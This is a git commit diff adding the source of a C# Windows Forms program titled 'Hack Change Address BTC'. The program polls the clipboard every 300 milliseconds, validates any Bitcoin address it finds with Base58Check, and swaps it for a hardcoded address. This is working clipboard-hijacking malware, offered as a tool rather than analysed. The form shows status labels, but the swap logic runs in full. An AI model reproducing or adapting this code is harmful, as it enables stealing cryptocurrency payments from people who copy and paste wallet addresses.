aa5f7b6bdf30eba7c7d52e10b16145080c676c6f
Matheus Grijó <matheusgrijo@matheusgrijo.com.br>
2018-07-30 16:34:43 -0300

    first
    frist

---
+++ Form1.Designer.cs
@@ -0,0 +1,113 @@
+﻿namespace ChangeAddressBTCHack
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            this.label1 = new System.Windows.Forms.Label();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // timer1
+            // 
+            this.timer1.Enabled = true;
+            this.timer1.Interval = 300;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(21, 11);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(194, 25);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Scan Clipboard...";
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(4, 39);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(238, 161);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 1;
+            this.pictureBox1.TabStop = false;
+            this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(58, 203);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(121, 13);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "GITHUB @matheusgrijo";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(248, 18);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(289, 182);
+            this.label3.TabIndex = 3;
+            this.label3.Text = resources.GetString("label3.Text");
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(552, 220);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
+            this.Text = "Hack Change Address BTC";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,167 @@
+﻿using Org.BouncyCastle.Crypto.Digests;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Text;
+using System.Windows.Forms;
+
+namespace ChangeAddressBTCHack
+{
+
+
+
+    public partial class Form1 : Form
+    {
+
+        string BTC_ADDRESS_HACK = "1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX";
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label(String value)
+        {
+            label1.Text = value ;            
+            this.Refresh();
+            this.Show();
+            System.Threading.Thread.Sleep(1000);
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            try
+            {
+                if (Clipboard.ContainsText())
+                {
+                    if (Validator.IsValidAddress(Clipboard.GetText()) && Clipboard.GetText() != BTC_ADDRESS_HACK)
+                    {                        
+                        label("Found Address!");
+                        Clipboard.Clear();
+                        Clipboard.SetText("1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX");
+                        label("Change Address...");
+                        label("Scan Clipboard...");                        
+                    }
+                }
+            }
+            catch { }
+        }
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+
+
+
+    public class Validator
+    {
+        public static bool IsValidAddress(string Address)
+        {
+            byte[] hex = Base58CheckToByteArray(Address);
+            if (hex == null || hex.Length != 21)
+                return false;
+            else
+                return true;
+        }
+
+        public static byte[] Base58CheckToByteArray(string base58)
+        {
+
+            byte[] bb = Base58.ToByteArray(base58);
+            if (bb == null || bb.Length < 4) return null;
+
+            Sha256Digest bcsha256a = new Sha256Digest();
+            bcsha256a.BlockUpdate(bb, 0, bb.Length - 4);
+
+            byte[] checksum = new byte[32];
+            bcsha256a.DoFinal(checksum, 0);
+            bcsha256a.BlockUpdate(checksum, 0, 32);
+            bcsha256a.DoFinal(checksum, 0);
+
+            for (int i = 0; i < 4; i++)
+            {
+                if (checksum[i] != bb[bb.Length - 4 + i]) return null;
+            }
+
+            byte[] rv = new byte[bb.Length - 4];
+            Array.Copy(bb, 0, rv, 0, bb.Length - 4);
+            return rv;
+        }
+
+    }
+
+    public class Base58
+    {
+        /// <summary>
+        /// Converts a base-58 string to a byte array, returning null if it wasn't valid.
+        /// </summary>
+        public static byte[] ToByteArray(string base58)
+        {
+            Org.BouncyCastle.Math.BigInteger bi2 = new Org.BouncyCastle.Math.BigInteger("0");
+            string b58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+
+            foreach (char c in base58)
+            {
+                if (b58.IndexOf(c) != -1)
+                {
+                    bi2 = bi2.Multiply(new Org.BouncyCastle.Math.BigInteger("58"));
+                    bi2 = bi2.Add(new Org.BouncyCastle.Math.BigInteger(b58.IndexOf(c).ToString()));
+                }
+                else
+                {
+                    return null;
+                }
+            }
+
+            byte[] bb = bi2.ToByteArrayUnsigned();
+
+            // interpret leading '1's as leading zero bytes
+            foreach (char c in base58)
+            {
+                if (c != '1') break;
+                byte[] bbb = new byte[bb.Length + 1];
+                Array.Copy(bb, 0, bbb, 1, bb.Length);
+                bb = bbb;
+            }
+
+            return bb;
+        }
+
+        public static string FromByteArray(byte[] ba)
+        {
+            Org.BouncyCastle.Math.BigInteger addrremain = new Org.BouncyCastle.Math.BigInteger(1, ba);
+
+            Org.BouncyCastle.Math.BigInteger big0 = new Org.BouncyCastle.Math.BigInteger("0");
+            Org.BouncyCastle.Math.BigInteger big58 = new Org.BouncyCastle.Math.BigInteger("58");
+
+            string b58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+
+            string rv = "";
+
+            while (addrremain.CompareTo(big0) > 0)
+            {
+                int d = Convert.ToInt32(addrremain.Mod(big58).ToString());
+                addrremain = addrremain.Divide(big58);
+                rv = b58.Substring(d, 1) + rv;
+            }
+
+            // handle leading zeroes
+            foreach (byte b in ba)
+            {
+                if (b != 0) break;
+                rv = "1" + rv;
+
+            }
+            return rv;
+        }
+
+    }
+}
